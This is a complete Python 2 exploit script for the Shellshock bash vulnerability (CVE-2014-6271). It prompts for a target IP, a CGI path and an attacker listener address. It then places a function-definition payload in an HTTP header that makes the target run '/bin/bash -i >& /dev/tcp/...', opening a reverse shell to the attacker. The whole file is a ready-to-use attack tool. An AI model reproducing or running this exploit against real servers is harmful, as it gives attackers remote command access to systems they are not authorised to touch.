#!/usr/bin/python
# Bash Bug
# CVE-2014-6271 - reverse shell based on bash option /dev/tcp
# Note that usually only REDHAT and CENTOS use this option

import httplib
import sys

def main(rhost, cgi_path, lhost, lport):

    connection = httplib.HTTPConnection(rhost)

    # The exploit test code in bash
    bash_code='() {{ ignored;}};/bin/bash -i >& /dev/tcp/{}/{} 0>&1'.format(lhost, lport)

    http_headers = {"Content-type": "application/x-www-form-urlencoded",
             "test":bash_code }

    connection.request("GET",cgi_path,headers=http_headers)

    response = connection.getresponse()
    print response.status, response.reason
    data = response.read()
    print data

if __name__ == "__main__":
    local_ip = raw_input("What is your IP ? ")
    local_port = raw_input("On which port would you like to be called back? ")
    remote_ip = raw_input("What is the remote IP ? ")
    path = raw_input("What is the path to the potentially vulnerable web app? ")
    main(remote_ip, path, local_ip, local_port)